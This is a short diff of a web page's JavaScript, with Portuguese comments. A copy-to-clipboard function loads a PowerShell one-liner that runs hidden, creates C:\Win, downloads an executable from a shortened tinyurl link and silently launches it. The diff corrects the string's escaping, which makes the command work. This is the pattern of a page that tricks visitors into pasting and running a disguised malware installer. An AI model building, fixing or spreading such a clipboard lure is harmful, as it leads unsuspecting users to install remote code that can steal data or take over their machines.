@@ -97,7 +97,7 @@
 
     <script>
         function copiarTexto() {
-            const comando = "powershell.exe -WindowStyle Hidden -Command "New-Item C:\Win -ItemType Directory -Force; Invoke-WebRequest -Uri 'https://tinyurl.com/4c24m3as' -OutFile C:\Win\instalador.exe; Start-Process C:\Win\instalador.exe -ArgumentList '/S' -WindowStyle Hidden"; // Define o texto que será copiado
+            const comando = "powershell.exe -WindowStyle Hidden -Command \"New-Item C:\\Win -ItemType Directory -Force; Invoke-WebRequest -Uri 'https://tinyurl.com/4c24m3as' -OutFile C:\\Win\\instalador.exe; Start-Process C:\\Win\\instalador.exe -ArgumentList '/S' -WindowStyle Hidden\""; // Define o texto que será copiado
 
             navigator.clipboard.writeText(comando).then(() => {
                 // Exibe a mensagem de confirmação
